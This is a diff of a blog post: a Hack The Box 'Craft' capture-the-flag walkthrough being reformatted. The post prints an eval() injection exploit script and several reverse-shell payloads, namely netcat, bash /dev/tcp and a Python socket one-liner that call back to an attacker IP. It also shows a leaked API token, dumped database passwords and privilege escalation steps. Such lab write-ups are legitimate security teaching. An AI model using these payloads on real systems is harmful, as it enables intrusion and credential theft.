@@ -14,7 +14,8 @@ toc_sticky: true
 
 Here is the output from Nmap, it shows several ports open.
 
-<pre class="show-lang:2 plain:false lang:sh highlight:0 decode:true ">nmap -n -Pn -sC -sV -p- 10.10.10.110
+{% highlight plain_text %}
+nmap -n -Pn -sC -sV -p- 10.10.10.110
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 19:58 EST
 Nmap scan report for 10.10.10.110
 Host is up (0.046s latency).
@@ -54,7 +55,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 78145.30 seconds
-</pre>
+{% endhighlight %}
 
 The high ports aren&#8217;t useful, and they&#8217;re probably from other hackers since I use the free servers.  
 The ports 22, 443, and 6022 are useful though, and the output shows some info about the services. It shows SSH services on ports 22 and 6022, and also an HTTPS service on 443.
@@ -101,7 +102,9 @@ On one of the Issue pages, you will see a couple of things worth noting:
 
 An auth token is left in the source within an example of how to interact with the API through Curl. Both of those points are useful to save in your notes for later.
 
-<pre class="top-set:false bottom-set:false nums:false nums-toggle:false wrap:true wrap-toggle:false lang:sh decode:true">curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'</pre>
+{% highlight plain_text %}
+curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+{% endhighlight %}
 
 Another noteworthy point is how they are talking about something awful happening with a particular patch. Take a look at the patch and save the code for later inspection.  
 [<img class="alignnone wp-image-422 size-large" src="/assets/uploads/2019/12/2019-12-03_19h08_49-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_19h08_49-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_19h08_49-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_19h08_49-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_19h08_49.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_19h08_49.png)
@@ -117,7 +120,9 @@ Using the credentials found in the commit log, try signing into services with it
 
 To use these creds for authenticating into the API you first have to understand the auth token. Take the example token found in the source and decode.
 
-<span class="lang:sh highlight:0 decode:true crayon-inline">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw</span>
+{% highlight plain_text%}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw
+{% endhighlight %}
 
 It&#8217;s a JWT token, which is put together in three sections.
 
@@ -152,7 +157,8 @@ Exploiting things like this is much easier when you can skip steps like token cr
 
 Just for laughs though, here is my custom script:
 
-<pre class="lang:python decode:true">#!/usr/bin/python3
+{% highlight plain_text %}
+#!/usr/bin/python3
 import requests
 import json
 
@@ -190,7 +196,7 @@ brew_data = {"name":"I Ponder Ale","brewer":"Ponder Brewery","style":"IPA","abv"
 
 r = requests.post(brew_url, headers=brew_headers, json=brew_data, verify=False)
 print(r.text)
-</pre>
+{% endhighlight %}
 
 That sloppy exploit script actually shows several of my attempts at getting the shellcode to work. I&#8217;ll explain some of the attempts, why they didn&#8217;t work, and what I ended up using.
 
@@ -202,14 +208,18 @@ There is almost always more than one way to write shellcode for any given exploi
 
 The most obvious shellcode here would be to get brew.py to execute a Netcat command back to a listener on our box. Tried that, didn&#8217;t work. I&#8217;m sure I forgot some of the attempts, but here are some variations I tried. All shellcode attempts were put in a variable called &#8216;payload&#8217;.
 
-payload = &#8220;\_\_import\_\_(&#8216;os&#8217;).system(&#8216;nc 10.10.14.61 5555 &&#8217;)&#8221;  
-payload = &#8220;\_\_import\_\_(&#8216;os&#8217;).popen(&#8216;nc -e /bin/sh 10.10.14.61 5555 &&#8217;)&#8221;  
-payload = &#8220;\_\_import\_\_(&#8216;os&#8217;).run(&#8216;nc 10.10.14.61 5555 &&#8217;)&#8221;  
-payload = &#8220;\_\_import\_\_(&#8216;subprocess&#8217;).Popen(&#8216;nc 10.10.14.16 5555&#8217;,shell=True)&#8221;
+{% highlight plain_text %}
+payload = "\_\_import\_\_('os').system('nc 10.10.14.61 5555 &')"  
+payload = "\_\_import\_\_('os').popen('nc -e /bin/sh 10.10.14.61 5555 &')"  
+payload = "\_\_import\_\_('os').run('nc 10.10.14.61 5555 &')"  
+payload = "\_\_import\_\_('subprocess').Popen('nc 10.10.14.16 5555',shell=True)"
+{% endhighlight %}
 
 Actually, that last one did connect back to my listener, but immediately closed no matter how I tried to issue the command. I read somewhere that it could have been due to netcat reading input from the python script and getting an EOF instead. So I tried setting it up with input and output file descriptors like this:
 
-payload = &#8220;\_\_import\_\_(&#8216;subprocess&#8217;).Popen(&#8216;nc 10.10.14.16 5555 &&#8217;,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)&#8221;
+{% highlight plain_text %}
+payload = "\_\_import\_\_('subprocess').Popen('nc 10.10.14.16 5555 &',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)"
+{% endhighlight %}
 
 Not really sure what was causing netcat to fail, but it did.
 
@@ -219,7 +229,9 @@ Bash has a shortcut to use network connections through the Proc system, and it&#
 
 To make it with when Bash is installed, however, you send IO redirects to /proc/tcp/\*ip\_addr\_of_target\*/\*port\*. This is what the command should have looked like:
 
-payload = &#8220;\_\_import\_\_(&#8216;subprocess&#8217;).Popen(&#8216;bash -i >& /dev/tcp/10.10.14.16/5555 0>&1&#8217;,shell=True)&#8221;
+{% highlight plain_text %}
+payload = "\_\_import\_\_('subprocess').Popen('bash -i >& /dev/tcp/10.10.14.16/5555 0>&1',shell=True)"
+{% endhighlight %}
 
 ### Attempt 3, Python Netcat Replacement:
 
@@ -227,23 +239,29 @@ This shellcode is all about python. Using socket and subprocess libraries to cre
 
 I followed the advice I found in [this article](https://pen-testing.sans.org/blog/2017/01/31/pen-test-poster-white-board-python-python-reverse-shell/) about condensing python shellcode into a one-liner. Start out with the following python code:
 
-<pre class="lang:python decode:true">import socket
+{% highlight python %}
+import socket
 import subprocess
 s=socket.socket()
 s.connect(("127.0.0.1",5555))
 while True:
      proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-     s.send(proc.stdout.read() + proc.stderr.read())</pre>
+     s.send(proc.stdout.read() + proc.stderr.read())
+{% endhighlight %}
 
 That is the Netcat replacement you need. After reading the article linked above, you&#8217;ll end up with a line like this:
 
-<pre class="lang:python decode:true">import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',5555))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())</pre>
+{% highlight python %}
+import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',5555))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())
+{% endhighlight %}
 
 The reason the shellcode is put into an exec() call instead of just sent to the vulnerable function, is that eval() is limited to only using expressions and we need to send the &#8216;import&#8217; statement. Exec() can handle statements like &#8216;import&#8217; and multiple lines, while the eval() only sees the exec() expression with a string inside of it.
 
 But even when you have this pretty shellcode that looks like it would work and you send it, you still won&#8217;t be happy yet&#8230; turns out that it needs more formatting work to get rid of syntax errors before it&#8217;s ready for prime time. This is the final shellcode that resulted in a reverse shell:
 
-<pre class="lang:python decode:true">payload = "exec(\"import socket, subprocess;s = socket.socket();s.connect((\'127.0.0.1\',5555))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())\")"</pre>
+{% highlight python %}
+payload = "exec(\"import socket, subprocess;s = socket.socket();s.connect((\'127.0.0.1\',5555))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())\")"
+{% endhighlight %}
 
 Notice that the newline is double escaped, and quotes inside the exec() call are escaped.
 
@@ -279,7 +297,7 @@ It&#8217;s best to get an overview of the database instead of just guessing tabl
 To get the file over to the remote system, set up a Netcat listener that feeds in your newly created file&#8230; like this:  
 <img class="alignnone size-full wp-image-466" src="/assets/uploads/2019/12/2019-12-05_18h48_05.png" alt="" width="801" height="117" srcset="/assets/uploads/2019/12/2019-12-05_18h48_05.png 801w, /assets/uploads/2019/12/2019-12-05_18h48_05-300x44.png 300w, /assets/uploads/2019/12/2019-12-05_18h48_05-768x112.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
 
-To finish getting the file transferred, go back into your reverse shell and connect back again to your new listener with <span class="lang:sh decode:true crayon-inline">nc 10.10.15.130 6666 > nop.py</span> .
+To finish getting the file transferred, go back into your reverse shell and connect back again to your new listener with `nc 10.10.15.130 6666 > nop.py` .
 
 The initial shell will become unusable after establishing this new connection. To fix that, use a &#8220;-w 3&#8221; switch on one of the Netcat commands to get it to timeout after 3 seconds. After the 3 seconds, you&#8217;ll be able to use the limited shell again without starting another one. Otherwise, just disconnect the reverse shell and re-establish it.
 
@@ -291,7 +309,8 @@ Awesome, we have results printed out! But it seems kind of short, there should b
 
 The fetchone() call is responsible for the limited results. Instead, use a similar function called fetchall(). Once you get all of the results, it should look like this when it&#8217;s cleaned up:
 
-<pre class="lang:python highlight:0 decode:true">[{'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'brew', 'TABLE_TYPE': 'BASE TABLE', 'ENGINE': 'InnoDB', 'VERSION': 10, 'ROW_FORMAT': 'Dynamic', 'TABLE_ROWS': 2338, 'AVG_ROW_LENGTH': 105, 'DATA_LENGTH': 245760, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': 2350, 'CREATE_TIME': datetime.datetime(2019, 2, 7, 1, 23, 11), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': 'utf8mb4_0900_ai_ci', 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
+{% highlight plain_text %}
+[{'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'brew', 'TABLE_TYPE': 'BASE TABLE', 'ENGINE': 'InnoDB', 'VERSION': 10, 'ROW_FORMAT': 'Dynamic', 'TABLE_ROWS': 2338, 'AVG_ROW_LENGTH': 105, 'DATA_LENGTH': 245760, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': 2350, 'CREATE_TIME': datetime.datetime(2019, 2, 7, 1, 23, 11), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': 'utf8mb4_0900_ai_ci', 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
  {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'craft', 'TABLE_NAME': 'user', 'TABLE_TYPE': 'BASE TABLE', 'ENGINE': 'InnoDB', 'VERSION': 10, 'ROW_FORMAT': 'Dynamic', 'TABLE_ROWS': 3, 'AVG_ROW_LENGTH': 5461, 'DATA_LENGTH': 16384, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': 6, 'CREATE_TIME': datetime.datetime(2019, 2, 7, 1, 23, 15), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': 'utf8mb4_0900_ai_ci', 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
  {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'CHARACTER_SETS', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
  {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'COLLATIONS', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
@@ -358,14 +377,17 @@ The fetchone() call is responsible for the limited results. Instead, use a simil
  {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'USER_PRIVILEGES', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
  {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'VIEWS', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
  {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'VIEW_ROUTINE_USAGE', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''},
- {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'VIEW_TABLE_USAGE', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''}]</pre>
+ {'TABLE_CATALOG': 'def', 'TABLE_SCHEMA': 'information_schema', 'TABLE_NAME': 'VIEW_TABLE_USAGE', 'TABLE_TYPE': 'SYSTEM VIEW', 'ENGINE': None, 'VERSION': 10, 'ROW_FORMAT': None, 'TABLE_ROWS': 0, 'AVG_ROW_LENGTH': 0, 'DATA_LENGTH': 0, 'MAX_DATA_LENGTH': 0, 'INDEX_LENGTH': 0, 'DATA_FREE': 0, 'AUTO_INCREMENT': None, 'CREATE_TIME': datetime.datetime(2019, 2, 2, 17, 59, 37), 'UPDATE_TIME': None, 'CHECK_TIME': None, 'TABLE_COLLATION': None, 'CHECKSUM': None, 'CREATE_OPTIONS': '', 'TABLE_COMMENT': ''}]
+ {% endhighlight %}
 
 There are actually only two application-related tables, &#8220;brew&#8221; and &#8220;user&#8221;. I think it&#8217;s pretty obvious which one we want to dump data from. Just modify the python script again to get the data you want.
 
 The dumped user data should look like this:
 
-<pre class="lang:python highlight:0 decode:true">[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
- {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]</pre>
+{% highlight plain_text %}
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
+ {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+{% endhighlight %}
 
 More credentials! That&#8217;s exactly what we need to get further into this box. Try your newly found credentials on everything to see if these guys re-use passwords.
 
@@ -397,7 +419,7 @@ Use this key to log into one of the SSH services that was discovered early in th
 
 <img class="alignnone size-full wp-image-479" src="/assets/uploads/2019/12/2019-12-09_14h23_49.png" alt="" width="722" height="57" srcset="/assets/uploads/2019/12/2019-12-09_14h23_49.png 722w, /assets/uploads/2019/12/2019-12-09_14h23_49-300x24.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
-After you have the keys saved to your box, make sure the agent is running by issuing the command <span class="lang:sh highlight:0 decode:true  crayon-inline ">ssh-agent</span> and then add the key with <span class="lang:sh highlight:0 decode:true  crayon-inline ">ssh-add</span> like this:  
+After you have the keys saved to your box, make sure the agent is running by issuing the command `ssh-agent` and then add the key with `ssh-add` like this:  
 <img class="alignnone size-full wp-image-480" src="/assets/uploads/2019/12/2019-12-09_14h27_19.png" alt="" width="722" height="110" srcset="/assets/uploads/2019/12/2019-12-09_14h27_19.png 722w, /assets/uploads/2019/12/2019-12-09_14h27_19-300x46.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 You will be prompted for a passphrase to use the private key, but good for us that Gilfoyle reuses passwords! Just copy and paste in the previously found password and you&#8217;re in!
@@ -408,7 +430,7 @@ You will be prompted for a passphrase to use the private key, but good for us th
 
 Getting root is super easy since we already saw the way in. From the [vault documentation](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html), just issue the following command that will do the same thing that script file does:
 
-<span class="lang:sh decode:true  crayon-inline">vault ssh -role root_otp -mode otp root@10.10.10.110</span>
+`vault ssh -role root_otp -mode otp root@10.10.10.110`
 
 And then you&#8217;ll be able to use the One Time Password for access to root on the vault.
 
